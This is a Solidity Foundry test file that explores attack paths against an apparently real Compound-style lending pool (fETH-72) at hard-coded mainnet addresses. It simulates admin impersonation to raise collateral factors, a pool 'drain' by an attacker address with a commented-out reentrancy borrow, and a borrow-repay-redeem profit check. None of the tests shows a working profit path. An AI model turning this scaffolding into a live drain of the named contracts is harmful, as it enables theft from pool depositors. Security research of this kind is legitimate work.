// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function markets(address) external view returns (bool, uint256);
    function _setCollateralFactor(address cToken, uint256 newCF) external returns (uint256);
    function admin() external view returns (address);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}

/// @dev Test: What if we use vm.prank as the admin to change CF?
/// (This tests whether the admin approach is viable if we could somehow become admin)
contract Pool72Test6 is Test {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    // Other markets
    address constant MARKET_1 = 0x644375F7145c7F2B520058043b9C7A30Ab16f1C3;
    address constant MARKET_2 = 0x4b3d6aD21CB4c02c0f38a131AE2358C2813Af13f;
    address constant MARKET_3 = 0x72c234187Df4d0fB6734afB7463351a86d023590;
    address constant MARKET_4 = 0x65D9912a6BfbD9ad91C02F14B83Eb36E027c4799;

    function testAdminSetCF() public {
        address admin = COMPTROLLER.admin();
        console.log("Admin:", admin);

        // Prank as admin to set CF on one of the other markets
        vm.startPrank(admin);
        uint256 result = COMPTROLLER._setCollateralFactor(MARKET_2, 500000000000000000); // 50%
        console.log("_setCollateralFactor result:", result);

        (bool listed, uint256 cf) = COMPTROLLER.markets(MARKET_2);
        console.log("Market 2 listed:", listed);
        console.log("Market 2 CF:", cf);
        vm.stopPrank();
    }

    // Test: what if we use one of the other markets (with CF=0) as collateral
    // and deposit into it, then borrow from fETH-72?
    // CF=0 means the deposit has 0 collateral value. Can't borrow.
    // But what if we can change CF via admin?

    // Test: Simulate admin changing CF, then drain
    function testAdminDrain() public {
        address admin = COMPTROLLER.admin();

        // Step 1: Admin sets CF on fETH-72 to 90% (maximize borrow)
        vm.prank(admin);
        COMPTROLLER._setCollateralFactor(address(FETH72), 900000000000000000); // 90%

        (bool listed, uint256 cf) = COMPTROLLER.markets(address(FETH72));
        console.log("fETH-72 CF after admin change:", cf);

        // Step 2: Deposit ETH, enter market, borrow max
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);

        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        // With 90% CF, we need ~82 ETH collateral to borrow ~73.7 ETH
        uint256 deposit = 90 ether;
        FETH72.mint{value: deposit}();

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        (uint256 err, uint256 liq, uint256 sf) = COMPTROLLER.getAccountLiquidity(attacker);
        console.log("Liquidity:", liq);

        uint256 borrowAmt = cash - 1;
        if (borrowAmt > liq) borrowAmt = liq;
        console.log("Borrow:", borrowAmt);

        // This will trigger reentrancy
        // uint256 result = FETH72.borrow(borrowAmt);

        vm.stopPrank();
    }

    // Test: direct approach - no reentrancy, just borrow and default
    // With CF=50%, deposit 150 ETH, borrow 73 ETH
    // Net: -150 + 73 = -77 ETH loss (BAD)
    // BUT: if we can redeem after defaulting somehow...
    // In Compound, you can't redeem while having insufficient collateral
    // UNLESS the borrow becomes 0 (repaid or liquidated)

    function testSafeBorrowAndDefault() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);

        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        // Deposit enough to borrow all the pool's cash
        // With CF=50%, we need 2x collateral
        uint256 deposit = cash * 2 + 1 ether;
        console.log("Deposit:", deposit);

        FETH72.mint{value: deposit}();

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        (,uint256 liq,) = COMPTROLLER.getAccountLiquidity(attacker);
        console.log("Liquidity:", liq);

        uint256 borrowAmt = cash - 1;
        console.log("Borrow:", borrowAmt);

        uint256 result = FETH72.borrow(borrowAmt);
        console.log("Borrow result:", result);

        // Now we have: deposit ETH locked as collateral, borrowed cash in hand
        // Can we repay the borrow with the borrowed ETH and then redeem?
        uint256 debt = FETH72.borrowBalanceStored(attacker);
        console.log("Debt:", debt);

        // Repay borrow
        FETH72.repayBorrow{value: debt}();
        console.log("Debt after repay:", FETH72.borrowBalanceStored(attacker));

        // Redeem
        uint256 cTokens = FETH72.balanceOf(attacker);
        console.log("cTokens:", cTokens);
        uint256 redeemResult = FETH72.redeem(cTokens);
        console.log("Redeem result:", redeemResult);

        console.log("Final balance:", attacker.balance);
        console.log("Started with: 500 ether");
        console.log("Profit:", int256(attacker.balance) - int256(500 ether));

        vm.stopPrank();
    }
}
